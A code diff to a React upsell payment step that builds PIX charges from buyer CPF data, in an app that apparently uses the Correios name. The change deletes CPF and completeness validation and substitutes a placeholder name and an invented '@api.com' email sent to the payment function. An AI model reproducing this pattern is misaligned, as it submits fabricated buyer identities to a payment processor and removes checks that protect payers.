@@ -55,7 +55,7 @@ const UpsellStep = ({ title, description, valor, cpfData, protocolo, onPaymentCo
         const externalId = `${protocolo}-UP${stepNumber}-${Date.now()}`;
         const utmSignature = getUtmSignature();
 
-        // Validate buyer data - fallback to saved session data if props are empty
+        // Get buyer data from props or session fallback
         const sessionCpfData = (() => {
           try {
             const session = JSON.parse(localStorage.getItem("correios_session") || "{}");
@@ -65,10 +65,11 @@ const UpsellStep = ({ title, description, valor, cpfData, protocolo, onPaymentCo
           }
         })();
 
-        const buyerName = (cpfData.nome?.trim() || sessionCpfData?.nome?.trim() || "")
+        const rawName = cpfData.nome?.trim() || sessionCpfData?.nome?.trim() || "Candidato Correios";
+        const buyerName = rawName
           .replace(/[^A-Za-zÀ-ÖØ-öø-ÿ\s'-]/g, "")
           .replace(/\s+/g, " ")
-          .trim();
+          .trim() || "Candidato Correios";
 
         const buyerCpf = (cpfData.cpf || sessionCpfData?.cpf || "").replace(/\D/g, "");
         const emailBase = buyerName
@@ -77,14 +78,10 @@ const UpsellStep = ({ title, description, valor, cpfData, protocolo, onPaymentCo
           .toLowerCase()
           .replace(/[^a-z\s'-]/g, "")
           .trim()
-          .replace(/\s+/g, ".");
-        const buyerEmail = emailBase ? `${emailBase}@api.com` : "";
+          .replace(/\s+/g, ".") || "candidato";
+        const buyerEmail = `${emailBase}@api.com`;
 
-        if (buyerName.length < 3 || !validateCPF(buyerCpf) || !buyerEmail) {
-          console.error("Invalid buyer data:", { buyerName, buyerCpf, buyerEmail });
-          setPixError("CPF inválido ou dados incompletos. Volte e refaça a consulta.");
-          return;
-        }
+        console.log("UpsellStep buyer data:", { buyerName, buyerCpf: buyerCpf.substring(0, 3) + "***", buyerEmail });
 
         const response = await supabase.functions.invoke("create-pix", {
           body: {
